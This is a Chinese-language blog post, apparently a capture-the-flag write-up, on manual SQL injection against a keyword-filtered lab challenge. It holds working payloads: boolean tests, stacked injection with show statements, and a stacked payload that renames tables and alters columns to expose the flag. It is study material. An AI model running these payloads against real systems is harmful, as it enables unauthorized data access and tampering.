@@ -1,0 +1,154 @@
+---
+layout: post
+title:  "2019-11-22-01"
+description: 医生是看人的病,记者是看病的人
+date:   2019-11-22
+tags: waf绕过 sql手注 堆叠注入 sql注入骚知识
+excerpt_separator: ~~~
+---
+1.sql手注(结合sqlmap一起)
+
+2.堆叠注入
+
+3.show的使用
+
+4.修改表名和字段名获取数据
+
+~~~
+开始我先用sqlmap跑(虽然网页注释"sqlmap是没有灵魂的")
+
+![My helpful screenshot](/assets/img/2019-11-22-01/1.png)
+
+找到注入点后继续尝试sqlmap找库和表,但似乎没什么结果,应该是一些关键字给过滤了
+
+那就试下手注吧.由sqlmap找到注入点的payload
+```
+inject=1' AND 1385=1385 AND 'sJCN'='sJCN
+```
+可以知道
+```
+1' or '1'='1 
+```
+成立(回显正常)
+
+尝试如下
+```
+1' or 1=1 #
+```
+也行得通,那就用这个形式吧(毕竟#这个方便点)
+
+正常流程走起，order by
+
+![My helpful screenshot](/assets/img/2019-11-22-01/2.png)
+
+可以看到order by 2的时候是正常回显了，order by 3就出错了，只有2个字段
+
+这时候用union select进行联合查询
+
+![My helpful screenshot](/assets/img/2019-11-22-01/3.png)
+
+返回一个正则过滤规则
+```
+"/select|update|delete|drop|insert|where|\./i"
+```
+可以看到几乎所有常用的字段都被过滤了
+
+这时候想到堆叠注入，试一下
+```
+0'; show databases ;#
+```
+![My helpful screenshot](/assets/img/2019-11-22-01/4.png)
+
+可以看到成功了，存在堆叠注入
+
+我们再直接show tables来查询下，试下能不能查询出表
+
+![My helpful screenshot](/assets/img/2019-11-22-01/5.png)
+
+可以看到有两张表，下面分别来看下两张表有什么字段
+```
+0'; show columns from words ;#
+```
+![My helpful screenshot](/assets/img/2019-11-22-01/6.png)
+
+(注:对表名为纯数字的表进行操作时，要在表名前后加上`符号,不然会出不来)
+```
+0'; show columns from `1919810931114514` ;#
+```
+![My helpful screenshot](/assets/img/2019-11-22-01/7.png)
+
+可以看到`1919810931114514`中有我们想要的flag字段
+
+但怎么获取里面的数据呢?
+
+由于过滤了大多数关键字,很难直接读出
+
+但我们发现,显示的时候是显示words表里的数据(根据id和data字段判断)
+
+能不能
+
+1.将`1919810931114514`表里的数据转到words表里
+
+2.将words表更名,再将`1919810931114514`表改为words,再将字段名改了
+
+由于没有过滤alert和rename关键字,这时候我们就可以采取第二个方法
+
+这时候我们就可以已下面的骚姿势进行注入：
+
+(1.将words表改名为word1或其它任意名字
+
+(2.1919810931114514改名为words
+
+(3.将新的word表插入一列，列名为id
+
+(4.将flag列改名为data
+
+构造payload
+```
+1';rename table words to word1;rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#
+```
+接着我们再用
+```
+1' or '1'='1 
+```
+或
+```
+1' or 1=1 # 
+```
+查询,就可以得到flag
+
+![My helpful screenshot](/assets/img/2019-11-22-01/8.png)
+
+可以看下现在数据库中存在的表
+
+![My helpful screenshot](/assets/img/2019-11-22-01/9.png)
+
+现在words表的结构（emmm,这里怎么还是flag字段名…）
+
+![My helpful screenshot](/assets/img/2019-11-22-01/10.png)
+
+语句有点问题啊，按照下面的语句重新更改，可以发现更改字段名成功
+```
+1'; ALTER TABLE words CHANGE flag data VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#
+```
+![My helpful screenshot](/assets/img/2019-11-22-01/11.png)
+
+emmm，这里就没问题了，输入1同样能得到flag了
+
+## 小总结:
+1.这里用sqlmap跑过的话可以发现能跑出数据表名那些，当时也没深度思考它的过滤规则，现在来看因为没有过滤show,和常用函数，所以sqlmap也能跑出一些数据
+
+2.show 的使用，前面对sql使用的时候，show 可能只用过show tables, show databases 这里还用到了show columns和结合from来使用
+
+3.堆叠注入，堆叠注入在原理上还是十分好懂的，但是还是有些生疏，后面再结合sqli靶场练习下
+
+4.这里的骚姿势才是获取flag的关键啊，修改表名和字段名…这种操作我也是第一次遇到…看别人writeup的时候看到alert，都没一下反应过来…
+
+## 知识点:
+1.sql手注(结合sqlmap一起)
+
+2.堆叠注入
+
+3.show的使用
+
+4.修改表名和字段名获取数据
